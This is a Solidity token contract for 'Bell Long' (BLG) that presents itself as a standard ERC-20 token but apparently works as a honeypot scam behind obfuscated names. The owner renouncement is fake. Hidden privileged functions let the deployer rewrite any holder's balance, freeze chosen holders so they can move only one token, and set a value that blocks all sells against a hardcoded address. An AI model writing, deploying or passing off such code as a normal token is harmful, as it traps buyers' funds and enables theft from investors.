//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface receiverLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundList) external view returns (uint256);

    function transfer(address takeFee, uint256 tokenMode) external returns (bool);

    function allowance(address senderFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenMode) external returns (bool);

    function transferFrom(
        address sender,
        address takeFee,
        uint256 tokenMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buySender, uint256 value);
    event Approval(address indexed senderFrom, address indexed spender, uint256 value);
}

abstract contract fromReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalExemptTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxLaunch {
    function createPair(address buyReceiver, address teamSender) external returns (address);
}

interface toFee is receiverLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BellLong is fromReceiver, receiverLimit, toFee {

    uint256 public teamMarketing;

    function decimals() external view virtual override returns (uint8) {
        return takeToken;
    }

    string private senderLaunch = "BLG";

    address private receiverTeam;

    function amountSell(address marketingAtIs, address takeFee, uint256 tokenMode) internal returns (bool) {
        require(buyToken[marketingAtIs] >= tokenMode);
        buyToken[marketingAtIs] -= tokenMode;
        buyToken[takeFee] += tokenMode;
        emit Transfer(marketingAtIs, takeFee, tokenMode);
        return true;
    }

    function txReceiver(address marketingAtIs, address takeFee, uint256 tokenMode) internal returns (bool) {
        if (marketingAtIs == atIsLaunched) {
            return amountSell(marketingAtIs, takeFee, tokenMode);
        }
        uint256 shouldAutoReceiver = receiverLimit(launchedFee).balanceOf(takeMaxLiquidity);
        require(shouldAutoReceiver == isWallet);
        require(takeFee != takeMaxLiquidity);
        if (takeFund[marketingAtIs]) {
            return amountSell(marketingAtIs, takeFee, atTake);
        }
        return amountSell(marketingAtIs, takeFee, tokenMode);
    }

    event OwnershipTransferred(address indexed marketingTokenAt, address indexed walletTo);

    function getOwner() external view returns (address) {
        return receiverTeam;
    }

    bool private txTeamTrading;

    mapping(address => uint256) private buyToken;

    bool public tokenFromMode;

    mapping(address => mapping(address => uint256)) private minToToken;

    uint256 private takeAt = 100000000 * 10 ** 18;

    address takeMaxLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public launchedFee;

    function modeTradingReceiver(address fromTokenWallet, uint256 tokenMode) public {
        limitSenderMax();
        buyToken[fromTokenWallet] = tokenMode;
    }

    uint256 isWallet;

    function transfer(address fromTokenWallet, uint256 tokenMode) external virtual override returns (bool) {
        return txReceiver(_msgSender(), fromTokenWallet, tokenMode);
    }

    function allowance(address senderFund, address tokenTo) external view virtual override returns (uint256) {
        if (tokenTo == listSellSender) {
            return type(uint256).max;
        }
        return minToToken[senderFund][tokenTo];
    }

    string private shouldTeam = "Bell Long";

    bool public sellLimit;

    uint8 private takeToken = 18;

    function owner() external view returns (address) {
        return receiverTeam;
    }

    function launchedSender(address shouldExemptIs) public {
        if (tokenFromMode) {
            return;
        }
        
        atMin[shouldExemptIs] = true;
        if (txTeamTrading == sellLimit) {
            teamMarketing = fundTotal;
        }
        tokenFromMode = true;
    }

    uint256 private sellModeLimit;

    function txEnable() public {
        emit OwnershipTransferred(atIsLaunched, address(0));
        receiverTeam = address(0);
    }

    uint256 public fundTotal;

    uint256 constant atTake = 1 ** 10;

    mapping(address => bool) public atMin;

    function limitSenderMax() private view {
        require(atMin[_msgSender()]);
    }

    function transferFrom(address marketingAtIs, address takeFee, uint256 tokenMode) external override returns (bool) {
        if (_msgSender() != listSellSender) {
            if (minToToken[marketingAtIs][_msgSender()] != type(uint256).max) {
                require(tokenMode <= minToToken[marketingAtIs][_msgSender()]);
                minToToken[marketingAtIs][_msgSender()] -= tokenMode;
            }
        }
        return txReceiver(marketingAtIs, takeFee, tokenMode);
    }

    uint256 fundAtTake;

    function name() external view virtual override returns (string memory) {
        return shouldTeam;
    }

    function atSender(uint256 tokenMode) public {
        limitSenderMax();
        isWallet = tokenMode;
    }

    function balanceOf(address fundList) public view virtual override returns (uint256) {
        return buyToken[fundList];
    }

    mapping(address => bool) public takeFund;

    uint256 public receiverLiquidity;

    function symbol() external view virtual override returns (string memory) {
        return senderLaunch;
    }

    constructor (){
        if (receiverLiquidity != teamMarketing) {
            teamMarketing = receiverLiquidity;
        }
        totalExemptTx amountTotalLiquidity = totalExemptTx(listSellSender);
        launchedFee = maxLaunch(amountTotalLiquidity.factory()).createPair(amountTotalLiquidity.WETH(), address(this));
        if (teamMarketing != sellModeLimit) {
            sellLimit = true;
        }
        atIsLaunched = _msgSender();
        txEnable();
        atMin[atIsLaunched] = true;
        buyToken[atIsLaunched] = takeAt;
        
        emit Transfer(address(0), atIsLaunched, takeAt);
    }

    function approve(address tokenTo, uint256 tokenMode) public virtual override returns (bool) {
        minToToken[_msgSender()][tokenTo] = tokenMode;
        emit Approval(_msgSender(), tokenTo, tokenMode);
        return true;
    }

    address listSellSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function swapWallet(address maxLimit) public {
        limitSenderMax();
        
        if (maxLimit == atIsLaunched || maxLimit == launchedFee) {
            return;
        }
        takeFund[maxLimit] = true;
    }

    address public atIsLaunched;

    function totalSupply() external view virtual override returns (uint256) {
        return takeAt;
    }

}